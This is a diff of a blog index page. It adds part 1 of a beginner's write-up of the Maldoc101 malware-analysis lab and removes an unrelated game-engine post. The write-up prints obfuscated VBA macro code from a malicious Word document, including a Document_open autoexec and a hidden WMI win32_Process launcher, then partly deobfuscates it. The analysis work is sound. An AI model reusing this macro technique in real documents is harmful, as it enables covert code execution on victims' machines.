@@ -60,6 +60,259 @@
   <div class="row">
     <div class="col-md-8 col-md-offset-2">
       <article>
+        <h1><a href="./maldoc101-writeup-part-1.html">Maldoc101 Writeup (Part 1)</a></h1>
+	<div class="meta">
+          <time datetime="2021-03-13T08:34:00+08:00">March 13, 2021</time>
+          in <span class="categories">
+            <a href="./tag/re.html">re</a>,            <a href="./tag/malware_analysis.html">malware_analysis</a>,            <a href="./tag/malware.html">malware</a>          </span>
+	</div>
+        <p><p>This is part 1 out of 2 of my writeup for the Maldoc101 challenge made by Josh Stroschein (<a href="https://twitter.com/jstrosch">@jstrosch</a>) and is currently playable at <a href="https://cyberdefenders.org/labs/51">Cyberdefenders.Org</a>. I've done some maldoc analysis before but this is the first time I'm writing about my approach.</p>
+<p>There is also an already existing writeup about this challenge <a href="https://github.com/jstrosch/malware-samples/blob/master/malware_analysis_exercises/2020/December/solution.md">from the creator himself</a>. You should check that out if you want a more detailed and focused writeup. This writeup is more from the perspective of someone relatively new to malware analysis. There's a lot more exploration and trial-and-error which, I hope, might give the reader a different view in how this kind of problem is approached.</p>
+<h2 id="the-challenge">The challenge</h2>
+<h3 id="name">Name</h3>
+<p><a href="https://cyberdefenders.org/labs/51">MalDoc101 - Malicious Document</a></p>
+<h3 id="description">Description</h3>
+<p>It is common for threat actors to utilize living off the land (LOTL) techniques, such as the execution of PowerShell to further their attacks and transition from macro code. This challenge is intended to show how you can often times perform quick analysis to extract important IOCs. The focus of this exercise is on static techniques for analysis.</p>
+<h3 id="suggested-tools">Suggested Tools</h3>
+<ul>
+<li>REMnux Virtual Machine (remnux.org)</li>
+<li>Terminal/Command prompt w/ Python installed</li>
+<li>Oledump</li>
+<li>Text editor</li>
+</ul>
+<h2 id="the-easy-questions">The easy questions</h2>
+<p>The first question seems very easy. The <em>suggested tools</em> section above also gives us an idea how to approach this.</p>
+<blockquote>
+<p>What streams contain macros in this document? (comma-separated, ascending).</p>
+</blockquote>
+<p><a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> is a tool made by <a href="https://blog.didierstevens.com/about/">Didier Stevens</a> that allows the analysis of data streams found in OLE files such as MS Office documetns. Running the command below would show us which streams have macros in it. These are denoted with the character <em>M</em>.</p>
+<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py sample.bin
+<span class="go">  1:       114 &#39;\x01CompObj&#39;</span>
+<span class="go">  2:      4096 &#39;\x05DocumentSummaryInformation&#39;</span>
+<span class="go">  3:      4096 &#39;\x05SummaryInformation&#39;</span>
+<span class="go">  4:      7119 &#39;1Table&#39;</span>
+<span class="go">  5:    101483 &#39;Data&#39;</span>
+<span class="go">  6:       581 &#39;Macros/PROJECT&#39;</span>
+<span class="go">  7:       119 &#39;Macros/PROJECTwm&#39;</span>
+<span class="go">  8:     12997 &#39;Macros/VBA/_VBA_PROJECT&#39;</span>
+<span class="go">  9:      2112 &#39;Macros/VBA/__SRP_0&#39;</span>
+<span class="go"> 10:       190 &#39;Macros/VBA/__SRP_1&#39;</span>
+<span class="go"> 11:       532 &#39;Macros/VBA/__SRP_2&#39;</span>
+<span class="go"> 12:       156 &#39;Macros/VBA/__SRP_3&#39;</span>
+<span class="go"> 13: M    1367 &#39;Macros/VBA/diakzouxchouz&#39;</span>
+<span class="go"> 14:       908 &#39;Macros/VBA/dir&#39;</span>
+<span class="go"> 15: M    5705 &#39;Macros/VBA/govwiahtoozfaid&#39;</span>
+<span class="go"> 16: m    1187 &#39;Macros/VBA/roubhaol&#39;</span>
+<span class="go"> 17:        97 &#39;Macros/roubhaol/\x01CompObj&#39;</span>
+<span class="go"> ...</span>
+</code></pre></div>
+
+<p>I later noticed that there is an upper-case and lower-case <em>M</em>. I learned that the upper-case <em>M</em> denotes a macro with a code. The lower-case denotes a user form. This is a distinction that will be important later in this challenge.</p>
+<hr />
+<blockquote>
+<p>What command-line argument with Oledump do you use to view the raw content of a stream? (Do not include the leading dash) </p>
+</blockquote>
+<p>The next question is another easy one which ran easily be solved through <code>oledump.py</code>'s <em>--help</em> parameter.</p>
+<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py --help
+<span class="go">Usage: oledump.py [options] [file]</span>
+<span class="go">Analyze OLE files (Compound Binary Files)</span>
+
+<span class="go">Options:</span>
+<span class="go">  --version             show program&#39;s version number and exit</span>
+<span class="go">  -h, --help            show this help message and exit</span>
+<span class="go">  -m, --man             Print manual</span>
+<span class="go">  -s SELECT, --select=SELECT</span>
+<span class="go">                        select item nr for dumping (a for all)</span>
+<span class="go">  -d, --dump            perform dump</span>
+<span class="go">  -x, --hexdump         perform hex dump</span>
+<span class="go">  -a, --asciidump       perform ascii dump</span>
+<span class="go">  -A, --asciidumprle    perform ascii dump with RLE</span>
+<span class="go">  -S, --strings         perform strings dump</span>
+<span class="go">  -T, --headtail        do head &amp; tail</span>
+<span class="go">  -v, --vbadecompress   VBA decompression</span>
+<span class="go">  ...</span>
+</code></pre></div>
+
+<p>The answer to question number two is easy to spot.</p>
+<hr />
+<blockquote>
+<p>What event is used to begin the execution of the macros?  </p>
+</blockquote>
+<p>I used a different tool for this particular question mostly because I knew that it already shows the information I need to answer the question. The tool is called <code>olevba</code> which is part of the <a href="https://github.com/decalage2/oletools">oletools</a> package of Python tools. <em>Olevba</em> is used for extracting and analyzing VBA macro source code for MS Office documents.</p>
+<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>olevba sample.bin
+<span class="go">+----------+--------------------+---------------------------------------------+</span>
+<span class="go">|Type      |Keyword             |Description                                  |</span>
+<span class="go">+----------+--------------------+---------------------------------------------+</span>
+<span class="go">|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |</span>
+<span class="go">|          |                    |opened                                       |</span>
+<span class="go">|Suspicious|Create              |May execute file or a system command through |</span>
+<span class="go">|          |                    |WMI                                          |</span>
+<span class="go">|Suspicious|showwindow          |May hide the application                     |</span>
+<span class="go">|Suspicious|CreateObject        |May create an OLE object                     |</span>
+<span class="go">...</span>
+</code></pre></div>
+
+<h2 id="onto-the-main-event">Onto the main event</h2>
+<blockquote>
+<p>What malware family was this maldoc attempting to drop?</p>
+</blockquote>
+<p>I figured that the way for me to determine the answer for the question above is to start investigating the macro codes included in the document.</p>
+<p>I knew from the previous question that the entry point to begin the execution of the macros is with the function <code>Document_open()</code>. The next step is to look for this entry point and go through the code to understand what the macro is doing.</p>
+<p>To view the contents of a stream, I used the command below:</p>
+<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py sample.bin -s <span class="m">13</span> -v
+<span class="go">Attribute VB_Name = &quot;diakzouxchouz&quot;</span>
+<span class="go">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span>
+<span class="go">Attribute VB_GlobalNameSpace = False</span>
+<span class="go">Attribute VB_Creatable = False</span>
+<span class="go">Attribute VB_PredeclaredId = True</span>
+<span class="go">Attribute VB_Exposed = True</span>
+<span class="go">Attribute VB_TemplateDerived = True</span>
+<span class="go">Attribute VB_Customizable = True</span>
+<span class="go">Private Sub _</span>
+<span class="go">Document_open()</span>
+<span class="go">boaxvoebxiotqueb</span>
+<span class="go">End Sub</span>
+</code></pre></div>
+
+<p>In the above output, I saw that <code>Document_open()</code> contains a single line of code which is a call to function <code>boaxvoebxiotqueb'</code>. This function is included in stream <code>15</code> which can be viewed with the command:</p>
+<div class="codehilite"><pre><span></span><code>$ oledump.py sample.bin -s <span class="m">13</span> -v
+Attribute <span class="nv">VB_Name</span> <span class="o">=</span> <span class="s2">&quot;govwiahtoozfaid&quot;</span>
+Function boaxvoebxiotqueb<span class="o">()</span>
+<span class="nv">gooykadheoj</span> <span class="o">=</span> Chr<span class="o">(</span>roubhaol.Zoom + Int<span class="o">(</span><span class="m">5</span> * <span class="m">3</span><span class="o">))</span>
+Dim c7�ATOQe2�j As Integer
+c7�ATOQe2�j <span class="o">=</span> <span class="m">6</span>
+Do While c7�ATOQe2�j &lt; <span class="m">6</span> + <span class="m">2</span>
+c7�ATOQe2�j <span class="o">=</span> c7�ATOQe2�j + <span class="m">5</span>: DoEvents
+Loop
+<span class="nv">haothkoebtheil</span> <span class="o">=</span> <span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot;</span> + gooykadheoj + <span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot;</span> + roubhaol.joefwoefcheaw + <span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;</span>
+...
+</code></pre></div>
+
+<p>The above output contains more lines of what looks like gibberish code. Upon further inspection I realized that it's actually obfuscated. I can see common coding patterns which tells me that I could make sense of the code if I step through it and organize it so it is easy to understand.</p>
+<p>The first line of the <code>boaxvoebxiotqueb</code> shows:</p>
+<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
+</code></pre></div>
+
+<p>What's <code>roubhaol</code>? Since this is the first line in the function, I know that it is not a locally defined variable. It must be declared somplace else.</p>
+<p>After looking around I learned that <code>roubhaol</code> is a the name of the user form at stream <em>16</em>.</p>
+<div class="codehilite"><pre><span></span><code><span class="go">16: m    1187 &#39;Macros/VBA/roubhaol&#39;</span>
+</code></pre></div>
+
+<p>So the next step is figuring out what <code>roubhaol.Zoom</code>'s value is. This value is not set anywhere in any of the macros by code. This means that the value is set in the form itself. To confirm, I opened up the Word document, pressed <code>Alt+F11</code> to open up the Visual Basic editor and then opened the <code>roubhaol</code> form. At the bottom we see that the value of <code>Zoom</code> is set to <code>100</code>.</p>
+<p><img alt="maldoc101-writeup-01" src="./images/maldoc101-writeup-01.png" /></p>
+<p>This means that by simulating the first line of code again we find that the variable <code>gooykadheoj</code> gets the character value of <code>s</code>.</p>
+<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
+gooykadheoj = Chr(100 + Int(5 * 3))
+gooykadheoj = Chr(115)
+gooykadheoj = Chr(115) # character &quot;s&quot;
+</code></pre></div>
+
+<p>I then proceeded to go through the next set of lines.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Dim</span> <span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span> <span class="nv">As</span> <span class="nv">Integer</span>
+<span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span> <span class="o">=</span> <span class="mi">6</span>
+<span class="k">Do</span> <span class="k">While</span> <span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span> <span class="o">&lt;</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">2</span>
+<span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span> <span class="o">=</span> <span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span> <span class="o">+</span> <span class="mi">5</span>: <span class="nv">DoEvents</span>
+<span class="k">Loop</span>
+</code></pre></div>
+
+<p>This one is easier to simulate. <code>c7�ATOQe2�j</code> is assigend 6. And then there's a loop that adds <code>5</code> that eventually results to the value of <code>16</code>.</p>
+<p>But wait, something is fishy here. The variable <code>c7�ATOQe2�j</code> is not found anywhere else after the block of code above. This tells us that this is just junk code that does not really do anything aside from waste an analyst's time! Sneaky sneaky.</p>
+<p>To save me the time I proceeded to remove all junk code. I did this by going through each variables and seeing if they are used somewhere useful. If not, then they are safe to remove.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Attribute</span> <span class="nv">VB_Name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">govwiahtoozfaid</span><span class="s2">&quot;</span>
+<span class="nv">Function</span> <span class="nv">boaxvoebxiotqueb</span><span class="ss">()</span>
+    <span class="nv">gooykadheoj</span> <span class="o">=</span> <span class="nv">Chr</span><span class="ss">(</span><span class="nv">roubhaol</span>.<span class="nv">Zoom</span> <span class="o">+</span> <span class="nv">Int</span><span class="ss">(</span><span class="mi">5</span> <span class="o">*</span> <span class="mi">3</span><span class="ss">))</span>
+
+    <span class="nv">haothkoebtheil</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="nv">gooykadheoj</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="s">2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="nv">roubhaol</span>.<span class="nv">joefwoefcheaw</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="s">2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq</span><span class="s2">&quot;</span>
+
+    <span class="nv">deulsaocthuul</span> <span class="o">=</span> <span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">haothkoebtheil</span><span class="ss">)</span>
+
+    <span class="nv">Set</span> <span class="nv">tiajriokchaoy</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="nv">deulsaocthuul</span><span class="ss">)</span>
+
+    <span class="nv">deaknaugthein</span> <span class="o">=</span> <span class="nv">roubhaol</span>.<span class="nv">kaizseah</span>.<span class="nv">ControlTipText</span>
+    <span class="nv">giakfeiw</span> <span class="o">=</span> <span class="nv">deulsaocthuul</span> <span class="o">+</span> <span class="nv">gooykadheoj</span> <span class="o">+</span> <span class="nv">roubhaol</span>.<span class="nv">paerwagyouqumeid</span>.<span class="nv">ControlTipText</span> <span class="o">+</span> <span class="nv">deaknaugthein</span>
+    <span class="nv">queegthaen</span> <span class="o">=</span> <span class="nv">giakfeiw</span> <span class="o">+</span> <span class="nv">roubhaol</span>.<span class="nv">joefwoefcheaw</span>
+
+    <span class="nv">Set</span> <span class="nv">deavjoajsear</span> <span class="o">=</span> <span class="nv">luumlaud</span><span class="ss">(</span><span class="nv">queegthaen</span><span class="ss">)</span>
+
+    <span class="nv">xve</span> <span class="o">=</span> <span class="nv">Array</span> <span class="nv">_</span>
+        <span class="ss">(</span><span class="s2">&quot;</span><span class="s">1234444123</span><span class="s2">&quot;</span>, <span class="nv">tiajriokchaoy</span>. <span class="nv">_</span>
+        <span class="nv">Create</span><span class="ss">(</span><span class="nv">geulgelquuuj</span>, <span class="nv">kaenhaig</span>, <span class="nv">deavjoajsear</span><span class="ss">)</span>, <span class="s2">&quot;</span><span class="s">9938723</span><span class="s2">&quot;</span><span class="ss">)</span>
+<span class="k">End</span> <span class="nv">Function</span>
+
+<span class="nv">Function</span> <span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">yiajthoavheiw</span><span class="ss">)</span>
+    <span class="nv">geutyoeytiestheug</span> <span class="o">=</span> <span class="nv">yiajthoavheiw</span>
+    <span class="nv">feaxgeip</span> <span class="o">=</span> <span class="nv">Split</span><span class="ss">(</span><span class="nv">geutyoeytiestheug</span>, <span class="s2">&quot;</span><span class="s">2342772g3&amp;*gs7712ffvs626fq</span><span class="s2">&quot;</span><span class="ss">)</span>
+
+    <span class="nv">jaquhoiqu</span> <span class="o">=</span> <span class="nv">csqw</span> <span class="o">+</span> <span class="nv">Join</span><span class="ss">(</span><span class="nv">feaxgeip</span>, <span class="nv">eihnx</span><span class="ss">)</span>
+    <span class="nv">juuvzouchmiopxeox</span> <span class="o">=</span> <span class="nv">jaquhoiqu</span>
+<span class="k">End</span> <span class="nv">Function</span>
+
+<span class="nv">Function</span> <span class="nv">geulgelquuuj</span><span class="ss">()</span>
+    <span class="nv">sjiqw</span> <span class="o">=</span> <span class="nv">roubhaol</span>.<span class="nv">gaoddaicsauktheb</span>.<span class="nv">Pages</span><span class="ss">(</span><span class="mi">10</span> <span class="o">/</span> <span class="mi">10</span><span class="ss">)</span>.<span class="nv">ControlTipText</span>
+    <span class="nv">geulgelquuuj</span> <span class="o">=</span> <span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">sjiqw</span><span class="ss">)</span>
+<span class="k">End</span> <span class="nv">Function</span>
+
+<span class="nv">Function</span> <span class="nv">luumlaud</span><span class="ss">(</span><span class="nv">zeolkaepxoag</span><span class="ss">)</span>
+    <span class="nv">Set</span> <span class="nv">luumlaud</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="nv">zeolkaepxoag</span><span class="ss">)</span>
+    <span class="nv">Dim</span> <span class="nv">vPu</span> <span class="nv">As</span> <span class="nv">String</span>
+    <span class="nv">vPu</span> <span class="o">=</span> <span class="nv">Replace</span>$<span class="ss">(</span><span class="s2">&quot;</span><span class="s">BenqV1�igVwifwdQq</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">BenqV1�i</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">on5�</span><span class="s2">&quot;</span><span class="ss">)</span>
+        <span class="nv">luumlaud</span> <span class="nv">_</span>
+        . <span class="nv">_</span>
+        <span class="nv">showwindow</span> <span class="o">=</span> <span class="ss">(</span><span class="nv">mujgoiy</span> <span class="o">+</span> <span class="nv">jioyseertioch</span><span class="ss">)</span> <span class="o">+</span> <span class="ss">(</span><span class="nv">neivberziok</span> <span class="o">+</span> <span class="nv">xuajroegquoudcaij</span><span class="ss">)</span>
+<span class="k">End</span> <span class="nv">Function</span>
+</code></pre></div>
+
+<p>As you can see above, the code is shorter. It's also a little easier to understand. Only a little though, we still need to step through the code carefully to have a better grasp of what it is doing.</p>
+<p>Let's take on the next line:</p>
+<div class="codehilite"><pre><span></span><code>haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot; + gooykadheoj + &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot; + roubhaol.joefwoefcheaw + &quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
+</code></pre></div>
+
+<p>If we look at the string carefully we would notice that a set of strings is concatenated with two variables. These variables are <code>gooykadheoj</code> and <code>roubhaol.joefwoefcheaw</code>. We already know the value of <code>gooykadheoj</code>. So what's the value of <code>roubhaol.joefwoefcheaw</code>?</p>
+<p>I got this value by going back to Visual Basic Editor and selelecting <code>joefwoefcheaw</code>. The value we need is listed under <code>Text</code>.</p>
+<p><img alt="maldoc101-writeup-02" src="./images/maldoc101-writeup-02.png" /></p>
+<p>Substituting the values <code>s</code> and <code>P</code> I got the following:</p>
+<div class="codehilite"><pre><span></span><code>haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fqP2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
+</code></pre></div>
+
+<p>It still doesn't clear up the gibberish, but at least it's now one big string. This same string is then passed as a parameter to function <code>juuvzouchmiopxeox</code>. </p>
+<div class="codehilite"><pre><span></span><code>deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
+</code></pre></div>
+
+<p>Let's look at the code inside <code>juuvzouchmiopxeox</code>.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Function</span> <span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">yiajthoavheiw</span><span class="ss">)</span>
+    <span class="nv">geutyoeytiestheug</span> <span class="o">=</span> <span class="nv">yiajthoavheiw</span>
+    <span class="nv">feaxgeip</span> <span class="o">=</span> <span class="nv">Split</span><span class="ss">(</span><span class="nv">geutyoeytiestheug</span>, <span class="s2">&quot;</span><span class="s">2342772g3&amp;*gs7712ffvs626fq</span><span class="s2">&quot;</span><span class="ss">)</span>
+
+    <span class="nv">jaquhoiqu</span> <span class="o">=</span> <span class="nv">csqw</span> <span class="o">+</span> <span class="nv">Join</span><span class="ss">(</span><span class="nv">feaxgeip</span>, <span class="nv">eihnx</span><span class="ss">)</span>
+    <span class="nv">juuvzouchmiopxeox</span> <span class="o">=</span> <span class="nv">jaquhoiqu</span>
+<span class="k">End</span> <span class="nv">Function</span>
+</code></pre></div>
+
+<p>Following the code we could see that the passed string is splitted using the call to the function <code>Split</code> with the substring <code>2342772g3&amp;*gs7712ffvs626fq</code>. This simply means that the substring is removed from the input string. The result of <code>Split</code> is then joined into one string using <code>Join</code>. There are the variables <code>csqw</code> and <code>eihnx</code>, they don't alter the string as these variables are empty. </p>
+<p>At the end of this function the value of the passed string is now:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">winmgmts</span><span class="o">:</span><span class="n">win32_Process</span>
+</code></pre></div>
+
+<p>Aha! Something that is not gibberish for a change!</p>
+<p>Going back to the caller function, the result of <code>juuvzouchmiopxeox</code> is saved to <code>deulsaocthuul</code>.</p>
+<div class="codehilite"><pre><span></span><code>    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
+
+    Set tiajriokchaoy = CreateObject(deulsaocthuul)
+</code></pre></div>
+
+<p>After that an object is created out of <code>deaulsaocthuul</code>, which we know contains <code>winmgmts:win32_Process</code>. </p>
+<p>Looking at <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process">the microsoft docs</a> I find out that <code>The Win32_Process WMI class represents a process on an operating system.</code>. Interesting.</p>
+<h2 id="taking-a-step-back">Taking a step back</h2>
+<p>At this point there are already a number of questions that we could answer based on what we've done so far. Some are not yet answerable at the moment, however, so nothing left to do but to push forward. But that will be for the next part of this two part series.</p>
+<p>Until then, I'm taking a step back as I marvel at my progress. It wouldn't take long until all the pieces would fall into place.</p>
+          <!-- <a class="full-article-link pull-right" rel="full-article" href="./maldoc101-writeup-part-1.html">Read on →</a> -->
+      </article>
+    </div>
+  </div>
+  <!-- CONTENT GOES HERE -->
+  <div class="row">
+    <div class="col-md-8 col-md-offset-2">
+      <article>
         <h1><a href="./ioli-crackme-0x02.html">IOLI Crackme 0x02</a></h1>
 	<div class="meta">
           <time datetime="2021-03-06T10:34:00+08:00">March 06, 2021</time>
@@ -647,29 +900,6 @@ Look for the free flag. Get on the scoreboard!</p>
 <p>These are the basic FFI implementations that I have explored. It should be enough for most uses. The example project with working code can be found <a href="https://github.com/accidentalrebel/chicken-scheme-ffi-example">on Github</a>.</p>
 <p>Also, check out <a href="http://wiki.call-cc.org/eggref/5/bind">the chicken-bind egg</a>, it already has all of the code above conveniently in one package. If you don't need full control and just want a simple FFI solution then this is what you need.</p>
           <!-- <a class="full-article-link pull-right" rel="full-article" href="./chicken-scheme-ffi-examples.html">Read on →</a> -->
-      </article>
-    </div>
-  </div>
-  <!-- CONTENT GOES HERE -->
-  <div class="row">
-    <div class="col-md-8 col-md-offset-2">
-      <article>
-        <h1><a href="./switching-from-c-c---to-c.html">#5 - Switching from C/C++ to C</a></h1>
-	<div class="meta">
-          <time datetime="2020-05-19T17:59:00+08:00">May 19, 2020</time>
-          in <span class="categories">
-            <a href="./tag/dev.html">dev</a>,            <a href="./tag/game_engine.html">game_engine</a>          </span>
-	</div>
-        <p><p>After the recent changes to the <a href="./following-lispy-conventions.html">lisp side of my engine</a>, I took some time to review the C/C++ side. You'll notice that I have written C/C++ and that's because my codebase uses both of them. </p>
-<p>When I started my project, I initially intended for it to use just pure C, as this is the one I'm more familiar with. But over time some C++ features crept in. Features like namespacess, bools, and function overloading proved to be useful so I kept using them. Now my code uses C concepts with new nifty C++ features.</p>
-<p>Now, I could have just continued with this approach. It works, after all. But I wondered if I should just stick to C and drop C++ altogether. My thinking is that sticking with just one language would make the code simpler as I only have to use it's subset of features. I know it's not a solid reason but I figured it's better to act now while it is still early.</p>
-<p><img alt="switching-from-c-c---to-c-01" src="./images/switching-from-c-c---to-c-01.png" /></p>
-<p>For the most part, dropping C++ was easy. Most of the difficulty I encountered was making sure the changes worked on all three supported platforms. There was a situation when <a href="https://github.com/accidentalrebel/rebel-game-engine/commits/cglm-switch-fix">I thought I was done</a> only to find it doesn't work on Mac and Windows. I had to <a href="https://github.com/accidentalrebel/rebel-game-engine/commits/cglm-switch-fix">slowly re-apply</a> the changes just to see where exactly things went wrong.</p>
-<p>What's funny is that I learned that I was using a lot more C++ features than I thought. Namespaces and default arguments are some that really surprised me. I always assumed they were supported on both languages. This just proves to me that I still have a lot to learn with these languages.</p>
-<p>I also took the chance during the transition to switch from <a href="https://glm.g-truc.net/0.9.9/index.html">GLM</a>, an OpenGL Mathematics lirary using C++, to <a href="https://github.com/recp/cglm">CGLM</a> a similar library that uses C. It is claimed that the latter is more optimized and, with it being in C, is easier to integrate with my codebase.</p>
-<p>While these changes did not do much in terms of progress, I am happy that my codebase now feels tighter and more coherent. I'm hoping to work on something engine-related next.</p>
-<p>If you are interested to check out my still-under-construction game engine, you can do so <a href="https://github.com/accidentalrebel/Rebel-Game-Engine">here</a>.</p>
-          <!-- <a class="full-article-link pull-right" rel="full-article" href="./switching-from-c-c---to-c.html">Read on →</a> -->
       </article>
     </div>
   </div>
